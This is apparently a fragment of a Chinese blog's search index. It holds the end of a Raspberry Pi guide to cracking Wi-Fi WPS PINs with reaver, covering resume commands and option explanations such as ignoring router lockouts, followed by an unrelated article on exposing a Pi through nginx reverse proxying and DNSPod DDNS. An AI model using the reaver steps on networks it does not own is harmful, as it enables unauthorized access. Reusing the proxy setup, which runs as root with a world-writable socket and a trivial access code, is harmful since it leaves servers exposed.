\u5f53\u51fa\u73b0\u6709\u767e\u5206\u6570\u65f6\u4f60\u5c31\u53ef\u4ee5\u7528crtl+c\u6765\u6682\u505c\uff0c\u5b83\u4f1a\u5c06reaver\u7684\u8fdb\u5ea6\u8868\u6587\u4ef6\u4fdd\u5b58\u5728 1.3\u7248\uff1a /etc/reaver/MAC\u5730\u5740.wpc 1.4\u7248\uff1a /usr/local/etc/reaver/MAC\u5730\u5740.wpc \u7528\u8d44\u6e90\u7ba1\u7406\u5668\uff0c\u624b\u5de5\u5c06\u4ee5MAC\u5730\u5740\u547d\u540d\u7684\u3001\u540e\u8f8d\u4e3awpc\u7684\u6587\u4ef6\u62f7\u8d1d\u5230U\u76d8\u6216\u786c\u76d8\u4e2d\uff0c \u4e0b\u6b21\u91cd\u542f\u52a8\u540e\uff0c\u518d\u624b\u5de5\u590d\u5236\u5230/etc/reaver/ \u76ee\u5f55\u4e0b\u5373\u53ef\u3002 \u4e0d\u662f\u6240\u6709\u7684\u8def\u7531\u90fd\u652f\u6301pin\u5b66\u4e60\u3002AP\u5173\u95ed\u4e86WPS\u3001\u6216\u8005\u6ca1\u6709QSS\u6ef4\uff0c\u4f1a\u51fa\u73b0 WARNING: Failed to associate with XX:XX:XX:XX:XX:XX (ESSID: XXXX) \u5b66\u4e60\u8fc7\u7a0b\u4e2d\u4e5f\u53ef\u968f\u65f6\u968f\u5730\u6309Ctrl+C\u7ec8\u6b62PJ\uff0c\u91cd\u590d\u540c\u4e00\u4e2aPIN\u7801 \u6216 timeou t\u53ef\u7ec8\u6b62\uff0creaver\u4f1a\u81ea\u52a8\u4fdd\u5b58\u8fdb\u5ea6\u3002 \u7ee7\u7eed\u4e0a\u6b21\u7684PJ\uff0c\u5219\u518d\u6b21\u5728\u7ec8\u7aef\u4e2d\u53d1\u9001: reaver -i mon0 -b MAC -vv \u8fd9\u6761\u6307\u4ee4\u4e0b\u8fbe\u540e\uff0c\u4f1a\u8ba9\u4f60\u9009y\u6216n\uff0c\u9009y\u540e\u5c31\u7ee7\u7eed\u4e86 \u5f53reaver\u786e\u5b9a\u524d4\u4f4dPIN\u5bc6\u7801\u540e\uff0c\u5176\u5de5\u4f5c\u5b8c\u6210\u4efb\u52a1\u8fdb\u5ea6\u6570\u503c\u5c06\u76f4\u63a5\u8df3\u8dc3\u81f390.9%\u4ee5\u4e0a\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u5269\u4f59\u4e00\u5343\u4e2a\u5bc6\u7801\u7ec4\u5408\u4e86\uff08\u603b\u5171\u4e00\u4e07\u4e00\u5343\u4e2a\u5bc6\u7801\uff09\u3002 \u53c2\u6570\u8be6\u7ec6\u8bf4\u660e: -m, --mac= MAC of the host system \u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528 -e, --essid= ESSID of the target AP \u8def\u7531\u5668\u7684ESSID\uff0c\u4e00\u822c\u4e0d\u7528\u6307\u5b9a -c, --channel= Set the 802.11 channel for the interface (implies -f) \u4fe1\u53f7\u7684\u9891\u9053\uff0c\u5982\u679c\u4e0d\u6307\u5b9a\u4f1a\u81ea\u52a8\u626b\u63cf -o, --out-file= Send output to a log file [stdout] \u6807\u51c6\u8f93\u51fa\u5230\u6587\u4ef6 -s, --session= Restore a previous session file \u6062\u590d\u8fdb\u7a0b\u6587\u4ef6 -C, --exec= Execute the supplied command upon successful pin recovery pin\u6210\u529f\u540e\u6267\u884c\u547d\u4ee4 -D, --daemonize Daemonize reaver \u8bbe\u7f6ereaver\u6210Daemon -a, --auto Auto detect the best advanced options for the target AP \u5bf9\u76ee\u6807AP\u81ea\u52a8\u68c0\u6d4b\u9ad8\u7ea7\u53c2\u6570 -f, --fixed Disable channel hopping \u7981\u6b62\u9891\u9053\u8df3\u8f6c -5, --5ghz Use 5GHz 802.11 channels \u4f7f\u75285G\u9891\u9053 -v, --verbose Display non-critical warnings (-vv for more) \u663e\u793a\u4e0d\u91cd\u8981\u8b66\u544a\u4fe1\u606f -vv \u53ef\u4ee5\u663e\u793a\u66f4\u591a -q, --quiet Only display critical messages \u53ea\u663e\u793a\u5173\u952e\u4fe1\u606f -h, --help Show help \u663e\u793a\u5e2e\u52a9 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a \u9ad8\u7ea7\u53c2\u6570: -p, --pin= Use the specified 4 or 8 digit WPS pin \u76f4\u63a5\u8bfb\u53d6psk\uff08\u672c\u4eba\u6d4b\u8bd5\u672a\u6210\u529f\uff0c\u5efa\u8bae\u7528\u7f51\u5361\u81ea\u5e26\u8f6f\u4ef6\u83b7\u53d6\uff09 -d, --delay= Set the delay between pin attempts 1 pin\u95f4\u5ef6\u65f6\uff0c\u9ed8\u8ba41\u79d2\uff0c\u63a8\u8350\u8bbe0 -l, --lock-delay= Set the time to wait if the AP locks WPS pin attempts [60] AP\u9501\u5b9aWPS\u540e\u7b49\u5f85\u65f6\u95f4 -g, --max-attempts= Quit after num pin attempts \u6700\u5927pin\u6b21\u6570 -x, --fail-wait= Set the time to sleep after 10 unexpected failures [0] 10\u6b21\u610f\u5916\u5931\u8d25\u540e\u7b49\u5f85\u65f6\u95f4\uff0c\u9ed8\u8ba40\u79d2 -r, --recurring-delay= Sleep for y seconds every x pin attempts \u6bcfx\u6b21pin\u540e\u7b49\u5f85y\u79d2 -t, --timeout= Set the receive timeout period [5] \u6536\u5305\u8d85\u65f6\uff0c\u9ed8\u8ba45\u79d2 -T, --m57-timeout= Set the M5/M7 timeout period [0.20] M5/M7\u8d85\u65f6\uff0c\u9ed8\u8ba40.2\u79d2 -A, --no-associate Do not associate with the AP (association must be done by another application) \u4e0d\u8fde\u5165AP\uff08\u8fde\u5165\u8fc7\u7a0b\u5fc5\u987b\u6709\u5176\u4ed6\u7a0b\u5e8f\u5b8c\u6210\uff09 -N, --no-nacks Do not send NACK messages when out of order packets are received \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -S, --dh-small Use small DH keys to improve crack speed \u4f7f\u7528\u5c0fDH\u5173\u952e\u503c\u63d0\u9ad8\u901f\u5ea6\uff08\u63a8\u8350\u4f7f\u7528\uff09 -L, --ignore-locks Ignore locked state reported by the target AP \u5ffd\u7565\u76ee\u6807AP\u62a5\u544a\u7684\u9501\u5b9a\u72b6\u6001 -E, --eap-terminate Terminate each WPS session with an EAP FAIL packet \u6bcf\u5f53\u6536\u5230EAP\u5931\u8d25\u5305\u5c31\u7ec8\u6b62WPS\u8fdb\u7a0b -n, --nack Target AP always sends a NACK [Auto] \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -w, --win7 Mimic a Windows 7 registrar [False] \u6a21\u62dfwin7\u6ce8\u518c\uff0c\u9ed8\u8ba4\u5173\u95ed","title":"\u5c0f\u7ed3-PJ\u65f6\u5e94\u56e0\u72b6\u51b5\u8c03\u6574\u53c2\u6570:"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#reference","text":"http://lok.me/a/1972.html http://bao3.blogspot.com/2013/05/raspberry-pi.html http://tieba.baidu.com/p/2682878857 http://www.nyaboron.moe/posts/606.html \u6587\u7ae0\u7248\u6743\u5f52 FindHao \u6240\u6709\u4e28\u672c\u7ad9\u9ed8\u8ba4\u91c7\u7528CC-BY-NC-SA 4.0\u534f\u8bae\u8fdb\u884c\u6388\u6743| \u8f6c\u8f7d\u5fc5\u987b\u5305\u542b\u672c\u58f0\u660e\uff0c\u5e76\u4ee5\u8d85\u94fe\u63a5\u5f62\u5f0f\u6ce8\u660e\u4f5c\u8005 FindHao \u548c\u672c\u6587\u539f\u59cb\u5730\u5740\uff1a https://www.findhao.net/easycoding/1184.html","title":"Reference"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/","text":"\u6811\u8393\u6d3e\u5229\u7528nginx\u53cd\u5411\u4ee3\u7406\uff0c\u6210\u4e3aIPv6/IPv4\u516c\u7f51\u670d\u52a1\u5668\uff08\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668\uff09 \u6548\u679c \u6811\u8393\u6d3e\u53ea\u9700\u8fde\u63a5\u7535\u6e90\uff0c\u4ee5\u53ca\u6709\u514d\u8d39IPv6\u670d\u52a1\u7684\u7f51\u7ebf\uff0c\u5373\u53ef\u6210\u4e3a\u516c\u7f51\u4e0a\u7684IPv6\u670d\u52a1\u5668\uff1b\u5982\u679c\u6709\u540c\u65f6\u652f\u6301IPv4\u548cIPv6\u7684\u53cc\u6808\u670d\u52a1\u5668\uff0c\u6811\u8393\u6d3e\u8fd8\u80fd\u6210\u4e3a\u516c\u7f51\u4e0a\u7684IPv4\u670d\u52a1\u5668\u3002 \u52a8\u673a \u4e4b\u524d\u53d1\u73b0\u5b66\u6821\u63d0\u4f9b\u514d\u8d39\u4e0d\u95f4\u65ad\u7684IPv6\u670d\u52a1\uff0c\u800c\u4e14DigitalOcean\u7684VPS\u4e5f\u80fd\u63d0\u4f9bIPv6\u7f51\u7edc\uff0c\u6240\u4ee5\u840c\u751f\u4e86\u81ea\u5df1\u5efa\u7acb\u670d\u52a1\u5668\u7684\u60f3\u6cd5\u3002 \u9274\u4e8e\u9700\u8981\u4e00\u53f0\u8017\u7535\u91cf\u5c0f\u3001\u566a\u58f0\u5c0f\u4e14\u80fd\u591f\u957f\u671f\u4e0d\u5173\u673a\u8fd0\u884c\u7684\u670d\u52a1\u5668\uff0c\u81ea\u7136\u800c\u7136\u60f3\u5230\u4e86\u6811\u8393\u6d3e\u3002\u4e8e\u662f\u7ecf\u8fc7\u51e0\u5929\u7684\u6298\u817e\uff0c\u7ec8\u4e8e\u5b9e\u73b0\u4e86\u628a\u6811\u8393\u6d3e\u4f5c\u4e3a\u516c\u7f51\u670d\u52a1\u5668\u7684\u60f3\u6cd5\uff0c\u4f46\u79bb\u7406\u60f3\u60c5\u51b5\u8fd8\u662f\u6709\u4e9b\u5dee\u8ddd\uff0c\u4e3b\u8981\u7279\u70b9\uff1a \u672c\u5730\u800c\u8a00\u53ea\u9700\u8981\u7528\u5230IPv6\u7f51\u7edc\uff0c\u5bf9IPv4\u7f51\u7edc\u6ca1\u6709\u8981\u6c42 \u4f5c\u4e3aIPv6\u670d\u52a1\u5668\uff0c\u91c7\u7528DDNS\u65b9\u6cd5\uff0c\u4f46\u5411DNSPod\u66f4\u65b0DNS\u4fe1\u606f\u9700\u8981\u6709\u672c\u5730\u6216\u8fdc\u7a0bIPv4\u7f51\u7edc\u7684\u652f\u6301 \u4f5c\u4e3aIPv4\u670d\u52a1\u5668\uff0c\u91c7\u7528nginx\u53cd\u5411\u4ee3\u7406\uff0c\u4e00\u5b9a\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668\uff08\u7406\u8bba\u4e0a\u672c\u5730\u53cc\u6808\u7535\u8111\u4e5f\u53ef\u4ee5\uff09 \u5927\u4f53\u601d\u8def \u8fd9\u91cc\u5047\u8bbe\u7684\u90fd\u662f\u91c7\u7528\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u5373DigitalOcean\u5728\u65e7\u91d1\u5c71\u7684\u540c\u65f6\u652f\u6301IPv4\u548cIPv6\u7684VPS\u3002 \u4f5c\u4e3aIPv6\u670d\u52a1\u5668 \u6b64\u65f6\u91c7\u7528DDNS\u65b9\u6cd5\uff0c\u56e0\u4e3a\u81ea\u5df1\u6709\u57df\u540d\uff0c\u800cDNSPod\u652f\u6301IPv6\u7684AAAA\u8bb0\u5f55\uff0c\u4e14DNSPod\u63d0\u4f9bAPI\uff0c\u6240\u4ee5\u91c7\u7528\u6bcf\u6b21IPv6\u5730\u5740\u53d8\u5316\u5219\u5411DNSPod\u53d1\u9001\u4fee\u6539\u8bb0\u5f55\u8bf7\u6c42\uff0c\u8fd9\u6837\u5b9e\u73b0DDNS\u3002 \u5176\u4e2d\u5b58\u5728\u7684\u95ee\u9898\u662fDNSPod\u5e76\u4e0d\u652f\u6301\u7eafIPv6\u73af\u5883\u4e0b\u7684API\u8bf7\u6c42\uff0c\u5373\u53d1\u9001\u8bf7\u6c42\u5fc5\u987b\u7528\u5230IPv4\u7f51\u7edc\uff08\u901a\u8fc7IPv4\u7f51\u7edc\u53d1\u9001IPV6\u8bb0\u5f55\u7684\u4fee\u6539\u8bf7\u6c42\uff09\u3002\u6240\u4ee5\u91c7\u7528\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u672c\u5730\u901a\u8fc7IPv6\u4f5c\u4e3ahttp\u7684client\u8bbf\u95ee\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u4f5c\u4e3ahttp server\u63a5\u6536\u8bf7\u6c42\uff0c\u5e76\u8bb0\u5f55\u8bf7\u6c42\u7684IPv6\u5730\u5740\uff08\u5373\u672c\u5730\u670d\u52a1\u5668IPv6\u5730\u5740\uff09\uff0c\u7136\u540e\u8fdc\u7a0b\u670d\u52a1\u5668\u901a\u8fc7IPv4\u8c03\u7528DNSPod API\uff0c\u4fee\u6539\u5bf9\u5e94\u8bb0\u5f55\uff0c\u5b9e\u73b0DDNS\u3002 \u4f5c\u4e3aIPv4\u670d\u52a1\u5668 \u6b64\u65f6\u91c7\u7528\u53cd\u5411\u4ee3\u7406\u65b9\u6cd5\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668nginx\u8bbe\u7f6e\u53cd\u5411\u4ee3\u7406\uff0c\u5730\u5740\u4e3a\u672c\u5730\u670d\u52a1\u5668IPv6\u5730\u5740\u3002\u8fd9\u6837\u53ef\u4ee5\u5229\u7528DDNS\u65f6\u8fdc\u7a0b\u670d\u52a1\u5668\u5f97\u5230\u7684IPv6\u5730\u5740\uff0c\u6765\u66f4\u65b0nginx\u4e2d\u53cd\u5411\u4ee3\u7406\u7684\u8bbe\u7f6e\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5f53\u67d0\u4e2aIPv4\u7528\u6237\u60f3\u8981\u8bbf\u95ee\u672c\u5730\u670d\u52a1\u5668\u65f6\uff0c\u5176\u901a\u8fc7\u57df\u540d\u8bbf\u95ee\u9996\u5148\u4f1a\u901a\u8fc7IPv4\u8bbf\u95ee\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u53cd\u5411\u4ee3\u7406\u5c06\u8bf7\u6c42\u901a\u8fc7IPv6\u53d1\u9001\u5230\u672c\u5730\u670d\u52a1\u5668\uff0c\u672c\u5730\u670d\u52a1\u5668\u4f5c\u51fa\u54cd\u5e94\u540e\uff0c\u5c06\u7ed3\u679c\u901a\u8fc7IPv6\u8fd4\u56de\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u6700\u540e\u901a\u8fc7IPv4\u8fd4\u56de\u5230\u7528\u6237\u3002 \u53ef\u4ee5\u8bf4\u4e00\u6b21\u8bf7\u6c42\u9700\u8981\u8de8\u8d8a4\u6b21\u592a\u5e73\u6d0b\uff0c\u4f46\u6839\u636e\u5b9e\u9645\u6d4b\u8bd5\uff0c\u54cd\u5e94\u65f6\u95f4\u8fd8\u662f\u53ef\u4ee5\u63a5\u53d7\u7684\u3002 \u5177\u4f53\u5b9e\u73b0 \u5173\u4e8e\u6811\u8393\u6d3e \u6811\u8393\u6d3e\u5e76\u6ca1\u6709\u4f7f\u7528\u5b98\u65b9\u56fa\u4ef6\uff0c\u800c\u662f\u6700\u521d\u91c7\u7528\u4e86Ubuntu 14.04 LTS\uff0c\u5176\u540e\u8f6c\u79fb\u5230Ubuntu 15.04\u3002\u56e0\u4e3a\u662f\u4f5c\u4e3aserver\u7528\uff0c\u6240\u4ee5\u66f4\u503e\u5411\u4e8e\u91c7\u7528Ubuntu\u7684server\u7248\u672c\u3002 \u5173\u4e8e\u6811\u8393\u6d3e\u5982\u4f55\u8fde\u4e0aIPv6\u7f51\u7edc\uff0c\u5b9e\u9645\u5c31\u662fUbuntu\u5982\u4f55\u8fde\u4e0aIPv6\u7f51\u7edc\u4e86\uff0c\u8fd9\u6837\u7684\u4f8b\u5b50\u5f88\u591a\uff0c\u5bf9\u4e8e\u67d0\u4e9b\u7279\u6b8a\u60c5\u51b5\uff0c\u6211\u4e4b\u524d\u4e5f\u6709\u5199\u53ef\u80fd\u7684\u89e3\u51b3\u65b9\u6cd5\u3002 \u8fdc\u7a0b\u670d\u52a1\u5668\u7aef \u56e0\u4e3a\u672c\u5730IPv6\u5730\u5740\u662fDHCP\u5206\u914d\uff0c\u4e00\u76f4\u5728\u53d8\u52a8\uff0c\u6240\u4ee5\u53ef\u80fd\u9700\u8981\u9891\u7e41\u5411\u8fdc\u7a0b\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u3002\u56e0\u4e3a\u6211\u7684\u8fdc\u7a0b\u670d\u52a1\u5668\u8fd0\u884c\u6709Flask\u5e94\u7528\uff0c\u800c\u6211\u5bf9Python\u6bd4\u8f83\u719f\u6089\uff0c\u52a0\u4e0a\u5bf9\u4e8e\u65b9\u6848\u5b9e\u73b0\u6211\u6bd4\u8f83\u503e\u5411\u4e8e\u7528http\u5b9e\u73b0\uff0c \u6240\u4ee5\u8003\u8651\u518d\u4e09\u51b3\u5b9a\u91c7\u7528nginx+uwsgi+flask+python \u3002 \u7ed3\u6784\uff1anginx\u8bbe\u5b9a\u8bf7\u6c42\u7684URL\uff0c\u5c06\u6b64URL\u7684\u8bf7\u6c42\u8bbe\u5b9a\u4e3a\u8f6c\u53d1\u5230flask\u5e94\u7528\u4e0a\uff1buwsgi\u4f5c\u4e3aflask\u548cnginx\u4e4b\u95f4\u7684\u6865\u6881\uff0c\u5e76\u4e14\u7528\u6765\u7ba1\u7406flask\u5e94\u7528\uff1bflask\u4f5c\u4e3a\u7f51\u7edc\u6846\u67b6\u63d0\u4f9b\u7f51\u7edc\u652f\u6491\uff0c\u5904\u7406\u8bf7\u6c42\u6570\u636e\u548c\u6570\u636e\u7684\u8fd4\u56de\uff1bpython\u4f5c\u4e3aflask\u91cc\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u7528\u6765\u8c03\u7528DNSPod API\uff0c\u4ee5\u53ca\u4fee\u6539nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5b9e\u73b0\u52a8\u6001\u7684\u53cd\u5411\u4ee3\u7406\u3002 DDNS\u90e8\u5206 \u5148\u8d34\u4e3b\u8981\u4ee3\u7801\uff1a def update_dnspod(self, ip): url = 'https://dnsapi.cn/Record.Modify' info = { 'login_email': 'xxx', 'login_password': 'xxx', 'format': 'json', 'domain_id': '23606146', 'record_id': '116841773', 'record_line': '\u9ed8\u8ba4', 'sub_domain': 'test', 'record_type': 'AAAA', 'value': ip } data = urllib.parse.urlencode(info).encode() t = urllib.request.urlopen(url, data=data) return t.read().decode('utf-8') \u5b9e\u9645\u4e0a\u5c31\u662f\u8c03\u7528API\u4e86\uff0c\u6211\u8fd9\u91cc\u662f\u5728\u66f4\u65b0test.polarxiong.com\u7684\u8bb0\u5f55\u3002 \u5173\u4e8e\u9700\u8981domain_id\u548crecord_id\uff0c\u4f3c\u4e4e\u53ea\u80fd\u4eceAPI\u83b7\u53d6 \uff0c\u5199\u4e86\u4e00\u6bb5\u4ee3\u7801\u7528\u6765\u83b7\u53d6\uff1a import urllib.request import urllib.parse import json login_email = 'THE_EMAIL' login_password = 'THE_PASSWORD' def get_json(url, data): con = urllib.request.urlopen( url, data=urllib.parse.urlencode(data).encode()) return json.loads(con.read().decode()) def get_domain_id(): url = 'https://dnsapi.cn/Domain.List' data = { 'login_email': login_email, 'login_password': login_password, 'format': 'json' } json = get_json(url, data) for domain in json['domains']: print('domain name:%s\\tdomain id:%s' % (domain['name'], domain['id'])) def get_record_id(domain_id): url = 'https://dnsapi.cn/Record.List' data = { 'login_email': login_email, 'login_password': login_password, 'format': 'json', 'domain_id': domain_id } json = get_json(url, data) print('domain name:%s\\tdomain id:%s' % (json['domain']['name'], json['domain']['id'])) for record in json['records']: print('record name:%s\\trecord type:%s\\trecord id:%s' % (record['name'], record['type'], record['id'])) if __name__ == '__main__': get_domain_id() \u6ce8\u610f\uff1a \u5bf9\u4e8e\u4fee\u6539\u8bb0\u5f55API\u7684\u8c03\u7528\uff0cDNSPod\u6709\u9650\u5236\uff1a\u5982\u679c1\u5c0f\u65f6\u4e4b\u5185\uff0c\u63d0\u4ea4\u4e86\u8d85\u8fc75\u6b21\u6ca1\u6709\u4efb\u4f55\u53d8\u52a8\u7684\u8bb0\u5f55\u4fee\u6539\u8bf7\u6c42\uff0c\u8be5\u8bb0\u5f55\u4f1a\u88ab\u7cfb\u7edf\u9501\u5b9a1\u5c0f\u65f6\uff0c\u4e0d\u5141\u8bb8\u518d\u6b21\u4fee\u6539\u3002\u6bd4\u5982\u539f\u8bb0\u5f55\u503c\u5df2\u7ecf\u662f 1.1.1.1\uff0c\u65b0\u7684\u8bf7\u6c42\u8fd8\u8981\u6c42\u4fee\u6539\u4e3a 1.1.1.1\u3002 \u53cd\u5411\u4ee3\u7406\u90e8\u5206 nginx\u914d\u7f6e\u6587\u4ef6\u4e2d\u53cd\u5411\u4ee3\u7406server\uff1a server { listen 80; server_name pi.polarxiong.com; location / { proxy_pass http://[2001:250:5002:8100::3:9b63]; # for raspberry pi proxy_set_header Host $host; } } python\u5b9e\u73b0\u4ee3\u7801\uff1a def update_nginx_config(self, ip): with open('/etc/nginx/sites-available/default', 'r') as f: s = f.read() r = re.compile(r'http://\\[(.*?)\\]; \\# for raspberry pi') s = s.replace(r.findall(s)[0], ip) with open('/etc/nginx/sites-available/default', 'w') as f: f.write(s) os.popen('service nginx restart') \u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u540e\uff0c\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u627e\u5230\u9700\u8981\u4fee\u6539\u7684IPv6\u5730\u5740\uff08 \u6240\u4ee5# for raspberry pi\u5fc5\u4e0d\u53ef\u5c11 \uff09\uff0c\u518d\u901a\u8fc7\u5b57\u7b26\u4e32\u66ff\u6362\uff08\u5c1d\u8bd5\u76f4\u63a5\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u66ff\u6362\uff0c\u4f46\u4e00\u76f4\u6ca1\u5b9e\u73b0\uff09\uff0c\u91cd\u65b0\u5199\u5165\u914d\u7f6e\u6587\u4ef6\uff1b\u6700\u540e\u91cd\u542fnginx\u670d\u52a1\u3002 \u5b9e\u9645\u4e0a\u8fd9\u662f\u4e00\u6bb5\u5f88\u5371\u9669\u7684\u4ee3\u7801\uff0c\u4f1a\u76f4\u63a5\u4fee\u6539nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u4e14\u901a\u8fc7\u547d\u4ee4\u884c\u91cd\u542fnginx\u670d\u52a1\u3002 Flask\u914d\u7f6e \u5148\u8d34\u4ee3\u7801\uff1a from flask import Flask, request import Ddns application = Flask(__name__) @application.route('/ipv6') def ipv6(): code = request.args['code'] if code != '80': return 'Bad Request' ip = request.remote_addr d = Ddns.Ddns() t = d.update(ip) return t if __name__ == '__main__': application.debug = True application.run() \u5ba2\u6237\u7aef\u53d1\u9001GET\u8bf7\u6c42\uff0cFlask\u6536\u5230\u8bf7\u6c42\u540e\u9996\u5148\u6821\u5bf9 code \uff0c\u7528\u6765\u9632\u6b62\u6076\u610f\u8bf7\u6c42\u3002\u7136\u540e\u83b7\u53d6\u5ba2\u6237\u7aefIP\u5730\u5740\uff0c\u4ea4\u7ed9python\u53bb\u5b9e\u73b0\u3002 uwsgi\u914d\u7f6e \u5173\u4e8enginx+uwsgi+flask\u7684\u914d\u7f6e\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u4e2d\u4ecb\u7ecd\u8fc7\uff0c\u8fd9\u91cc\u5c31\u53ea\u5199\u4e3b\u8981\u90e8\u5206 systemd\u4e2d\u914d\u7f6e\u670d\u52a1 \u8def\u5f84\uff1a /etc/systemd/system/ddns.service [Unit] Description=uWSGI instance to serve DDNS After=network.target [Service] User=root Group=root WorkingDirectory=/home/zhantong/ddns Enrironment=\"PATH=/usr/bin\" ExecStart=/usr/bin/uwsgi --ini ddns.ini [Install] WantedBy=multi-user.target \u8fd9\u91cc\u8bbe\u5b9aUser\u548cGroup\u5747\u4e3aroot\u662f\u6781\u5176\u5371\u9669\u7684\uff0c\u4f46\u4e5f\u662f\u5fc5\u987b\u7684\uff0c\u56e0\u4e3a\u9700\u8981\u8bfb\u53d6\u548c\u5199\u5165nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u4e14\u901a\u8fc7\u547d\u4ee4\u884c\u91cd\u542fnginx\u670d\u52a1\u3002 uwsgi\u914d\u7f6e\u6587\u4ef6 \u8def\u5f84\uff1a /home/zhantong/ddns [uwsgi] module = proxy_and_ddns processes = 1 vhost = true socket = ddns.sock chmod-socket = 777 vacuum = true die-on-term = true \u8fd9\u91cc\u5176\u5b9e\u6709\u4e00\u4e9b\u7ec6\u8282\u95ee\u9898\uff0c\u5c31\u4e0d\u8bf4\u4e86\u3002 proxy_and_ddns \u5c31\u662f proxy_and_dds.py \uff0cflask\u4ee3\u7801\u3002 nginx\u914d\u7f6e \u6700\u540e\u9700\u8981\u52a0\u5165\u8bf7\u6c42URL\uff0c\u5e76\u5c06\u5176\u8f6c\u53d1\u5230flask\uff0c\u6240\u4ee5nginx\u5173\u4e8e\u8fd9\u90e8\u5206\u7684server\uff1a server { listen [::]:80 ipv6only=on; server_name ipv6.polarxiong.com; location / { include uwsgi_params; uwsgi_pass unix:/home/zhantong/ddns/ddns.sock; } } ipv6.polarxiong.com\u5728DNSPod\u4e2d\u8bbe\u7f6e\u4e86\u8bb0\u5f55\u4e3aAAAA\uff0c\u6307\u5411\u8fdc\u7a0b\u670d\u52a1\u5668\u7684IPv6\u5730\u5740\u3002 \u672c\u5730\u670d\u52a1\u5668 \u672c\u5730\u670d\u52a1\u5668\u7684\u5de5\u4f5c\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u5bf9\u5bf9\u5e94URL\u53d1\u9001GET\u8bf7\u6c42 import urllib.request code = '80' urllib.request.urlopen('http://ipv6.polarxiong.com/ipv6?code=' + code) \u53ef\u4ee5\u5229\u7528Ubuntu\u4e2d\u7684corn\u6765\u5b9e\u73b0\u5b9a\u65f6\u8fd0\u884c\u3002 \u7ed3\u675f \u4e0a\u9762\u8bf4\u7684\u5f88\u4e71\uff0c\u4f46\u7406\u987a\u4e86\u8fd8\u662f\u633a\u5bb9\u6613\u7684\uff0c\u6700\u540e\u7684\u7ed3\u679c\u5c31\u662ftest.polarxiong.com\u5bf9\u5e94\u7684IP\u5c31\u662f\u6811\u8393\u6d3e\u7684IPv6\u5730\u5740\uff0c\u5373\u901a\u8fc7IPv6\u8bbf\u95eetest.polarxiong.com\u5c31\u662f\u76f4\u63a5\u8bbf\u95ee\u6811\u8393\u6d3e\uff1b\u800cpi.polarxiong.com\u662f\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u5668\u53cd\u5411\u4ee3\u7406\uff0c\u901a\u8fc7IPv4\u8bbf\u95ee\u6811\u8393\u6d3e\u3002 \u9644\u5f55 flask\u548cpython\u5b8c\u6574\u4ee3\u7801 flask \u6587\u4ef6\u540d\uff1aproxy_and_ddns.py from flask import Flask, request import Ddns application = Flask(__name__) @application.route('/ipv6') def ipv6(): code = request.args['code'] if code != '80': return 'Bad Request' ip = request.remote_addr d = Ddns.Ddns() t = d.update(ip) return t if __name__ == '__main__': application.debug = True application.run() python \u6587\u4ef6\u540d\uff1aDdns.py import urllib.request import os import re class Ddns(): def update_nginx_config(self, ip): with open('/etc/nginx/sites-available/default', 'r') as f: s = f.read() r = re.compile(r'http://\\[(.*?)\\]; \\# for raspberry pi') s = s.replace(r.findall(s)[0], ip) with open('/etc/nginx/sites-available/default', 'w') as f: f.write(s) os.popen('service nginx restart') def update_dnspod(self, ip): url = 'https://dnsapi.cn/Record.Modify' info = { 'login_email': 'xxx', 'login_password': 'xxx', 'format': 'json', 'domain_id': '23606146', 'record_id': '116841773', 'record_line': '\u9ed8\u8ba4', 'sub_domain': 'test', 'record_type': 'AAAA', 'value': ip } data = urllib.parse.urlencode(info).encode() t = urllib.request.urlopen(url, data=data) return t.read().decode('utf-8') def update(self, ip): t=self.update_dnspod(ip) self.update_nginx_config(ip) return t \u53c2\u8003 DNSPod\u7528\u6237API\u6587\u6863 \u2014 DNSPod API Doc 1.0.0 documentation \u7528 Python \u811a\u672c\u5b9e\u73b0\u5bf9 Linux \u670d\u52a1\u5668\u7684\u76d1\u63a7 Nginx\u53cd\u5411\u4ee3\u7406\u7684\u914d\u7f6e -- \u7b80\u660e\u73b0\u4ee3\u9b54\u6cd5 \u539f\u6587\u94fe\u63a5\uff1a 